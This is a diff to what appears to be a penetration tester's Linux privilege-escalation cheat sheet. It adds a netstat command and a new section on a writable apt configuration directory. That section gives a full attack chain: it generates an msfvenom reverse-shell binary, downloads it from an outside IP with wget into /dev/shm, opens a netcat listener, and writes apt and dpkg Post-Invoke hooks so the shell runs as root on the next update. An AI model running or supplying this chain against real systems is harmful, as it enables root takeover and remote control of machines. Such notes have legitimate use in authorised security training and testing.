@@ -50,6 +50,7 @@ ss -anp
 ss -lntp
 netstat -antup
 sudo netstat -ltnp
+netstat -a -o | grep "9090"
 ```
 
 If a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system.
@@ -471,4 +472,18 @@ If you have access to any source code that you can run as admin or another user,
 
 Make sure that you investigate the logs folder whenever you run into a .git. Of course, also run git show and git log (redundant).
 
-#### Don't forget to test 'su' as any other user with shell: without password and with their names as password COPY demo from '/dev/shm/PostgreSQL.317703146';
+#### Don't forget to test 'su' as any other user with shell: without password and with their names as password
+
+#### Writable /etc/apt/apt.conf.d/ Directory
+
+This would trigger with an apt-get update.
+
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.45.178 LPORT=80 -o shell
+wget http://192.168.45.178:8000/shell -O /dev/shm/shell
+chmod +x /dev/shm/shell
+sudo nc -lvnp 80
+echo 'APT::Update::Post-Invoke-Success {"/dev/shm/shell";};' > 99-post-upgrade
+echo 'APT::Update::Post-Invoke {"/dev/shm/shell";};' >> 99-post-upgrade
+echo 'Dpkg::Post-Invoke {"/dev/shm/shell";};' >> 99-post-upgrade
+```
